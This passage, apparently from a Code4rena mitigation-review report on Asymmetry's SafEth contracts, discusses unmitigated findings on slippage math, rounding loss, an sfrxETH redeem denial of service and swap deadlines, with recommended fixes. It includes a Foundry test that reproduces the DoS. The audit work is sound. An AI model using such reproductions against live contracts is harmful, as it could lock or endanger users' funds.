solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The calculation of <code>minOut</code> is applying the slippage directly to the <code>stEthBal</code> variable, which is the stETH amount. This means that this calculation is assuming a 1:1 peg (see original report in H-06 for a more detailed explanation).</p>\n<h3 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>High. The conditions in the original report for H-06 still apply. If stETH trades below the defined slippage, the <code>withdraw()</code> will revert as the <code>minOut</code> will always be above the current price, DoSing the protocol.</p>\n<h3 id=\"recommendation-12\" style=\"position:relative;\"><a href=\"#recommendation-12\" aria-label=\"recommendation 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The calculation for <code>minOut</code> should take into account the current price of stETH, which can now be fetched using <code>ethPerDerivative()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51#issuecomment-1539139184\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks.</p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-m-01-issue-not-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-m-01-issue-not-mitigated\" aria-label=\"mitigation of m 01 issue not mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/59\">Mitigation of M-01: Issue not mitigated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/59\">d3e4</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/77\">adriro</a></em></p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L87-L119</code></p>\n<h3 id=\"mitigated-issue\" style=\"position:relative;\"><a href=\"#mitigated-issue\" aria-label=\"mitigated issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigated issue</h3>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078\">M-01: Division before multiplication truncate minOut and incurs heavy precision loss and result in insufficient slippage protection</a></p>\n<p>The issue was a loss of precision of three different kinds.<br></p>\n<ol>\n<li><code>(a/b)*c &#x3C;= a*c/b</code> in the slippage calculations in <code>Reth.withdraw()</code>, <code>Reth.deposit()</code> and <code>SfrxEth.withdraw()</code>.</li>\n<li><code>a/k + b/k &#x3C;= (a + b)/k</code> in the calculations of <code>underlyingValue</code>, <code>totalStakeValueEth</code> in <code>SafEth.stake()</code>.</li>\n<li><code>a/(b/c) >= a*c/b</code> in the calculation of <code>mintAmount</code> in <code>SafEth.stake()</code>.</li>\n</ol>\n<h3 id=\"mitigation-review-1\" style=\"position:relative;\"><a href=\"#mitigation-review-1\" aria-label=\"mitigation review 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation review</h3>\n<p>The instances of (1) in <code>Reth.withdraw()</code> and <code>SfrxEth.withdraw()</code> have been correctly refactored.<br>\nBut <code>Reth.deposit()</code> is now: </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"173\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) * (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">idealOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><code>minOut</code> is still of the form <code>(a/b)*c</code>. It should be refactored to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"174\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><code>idealOut</code> may then be refactored to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"175\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">idealOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>(which has the same precision.)</p>\n<p>All of (2) and (3) remain unaltered however. <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1044\">This duplicate of M-01</a> provides an explicit refactoring of <code>stake()</code> which solves them. However, because of the introduction of <code>SafEth.approxPrice()</code> (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L359-L373</code>) this refactoring will have to be reworked. Technically, this is an entirely new issue, which is why this is reported in detail in “Rounding loss in and with approxPrice()“.</p>\n<hr>\n<h2 id=\"mitigation-of-m-02-issue-not-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-m-02-issue-not-mitigated\" aria-label=\"mitigation of m 02 issue not mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43\">Mitigation of M-02: Issue not mitigated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43\">adriro</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/63\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/15\">0x52</a></em></p>\n<p>Link to Issue: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049</a></p>\n<h3 id=\"comment\" style=\"position:relative;\"><a href=\"#comment\" aria-label=\"comment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comment</h3>\n<p>Issue M-02 describes an edge case in which the SfrxEth derivative may revert under an scenario where the calculation of the redeem amount in the sfrxETH vault is zero, causing a potential DoS in the protocol.</p>\n<p>The proposed fix by the sponsor is to use the derivative enable/disable feature, probably with the intention of disabling the SfrxEth in case the issue is manifested. I don’t think this fully mitigates the issue for at least two major reasons, which are described below.</p>\n<h3 id=\"technical-details-3\" style=\"position:relative;\"><a href=\"#technical-details-3\" aria-label=\"technical details 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h3>\n<p>The reasoning for the issue in the original report is that if the derivative weight has been set to 0, then a series of staking/unstaking actions could dilute the amount for the SftxEth derivative and eventually lead to the <code>withdraw()</code> being called with 1. </p>\n<p>The proposed mitigation misses a very important detail, which is that the disable feature operates on a global level. While the issue may be experienced by a few users that triggered the particular conditions for this to happen, other users may still have a normal or significant amount of funds in the derivative. The protocol cannot simply disable the derivative just to address the problem of a few, doing so may also lock funds for other users of the protocol.</p>\n<p>It should be also noted that the described scenario in the original issue does not represent the only case which may trigger the issue. Any situation where the calculated redeem amount is low enough to be converted to zero assets given the required conditions (total assets and total shares) in the sfrxETH vault will trigger the issue. As a quick example, the following test reproduces the case where the user has a low number of SafEth tokens, note that here the weight of the derivative isn’t set to zero:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"176\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Test for mitigation contest. MR-M-02</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_SafEth_SfrxRedeemDos</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sfrxEthVault</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">sfrxEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">SFRX_ETH_ADDRESS</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISfrxEthVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sfrxEthVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Ensure assets is below shares to match conditions in original issue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">store</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sfrxEthVault</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">7</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Setup derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deployer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sfrxEth</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// user has 1 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// user stakes ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">initialAmount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// user withdraws everything but 1 share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userShares</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Now user tries to withdraw the remaining share. This will fail on the redeem function due</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// to the same issue described in the original issue.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This also demonstrates that the proposed solution isn’t a proper mitigation. The protocol can’t shutdown a derivative if an individual user is faced with such conditions that trigger the issue.</p>\n<h3 id=\"recommendation-13\" style=\"position:relative;\"><a href=\"#recommendation-13\" aria-label=\"recommendation 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Apply the recommendation proposed in the original report for M-02. Use the <code>previewRedeem()</code> function to check if the returned amount will be zero to skip the revert. This will address the issue at the individual level of a particular account, without dealing with other potential issues of disabling a derivative.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43#issuecomment-1539156317\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>That makes sense. Thanks.</p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-m-04-issue-not-mitigated-there-is-still-no-way-to-set-a-deadline\" style=\"position:relative;\"><a href=\"#mitigation-of-m-04-issue-not-mitigated-there-is-still-no-way-to-set-a-deadline\" aria-label=\"mitigation of m 04 issue not mitigated there is still no way to set a deadline permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36\">Mitigation of M-04: Issue not mitigated, there is still no way to set a deadline</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36\">d3e4</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/45\">adriro</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/16\">0x52</a></em></p>\n<h3 id=\"mitigated-issue-1\" style=\"position:relative;\"><a href=\"#mitigated-issue-1\" aria-label=\"mitigated issue 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigated issue</h3>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/932\">M-04: Lack of deadline for uniswap AMM</a></p>\n<p>The issue was that the deposit for rETH via Uniswap didn’t include a deadline.</p>\n<h3 id=\"mitigation-review-2\" style=\"position:relative;\"><a href=\"#mitigation-review-2\" aria-label=\"mitigation review 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation review</h3>\n<p>Uniswap is no longer used. Instead RocketSwapRouter is used which swaps what cannot be deposited in the pool on either Uniswap or Balancer, according to provided weights. A 100% Balancer weight has been chosen, <a href=\"https://etherscan.io/address/0x16d5a408e807db8ef7c578279beeee6b228f1c1c#code#F19#L262\">which sets the deadline to <code>block.timestamp</code></a>. (RocketSwapRouter sets the same deadline for Uniswap.)</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36#issuecomment-1539163682\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks.</p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-m-05-issue-not-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-m-05-issue-not-mitigated\" aria-label=\"mitigation of m 05 issue not mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 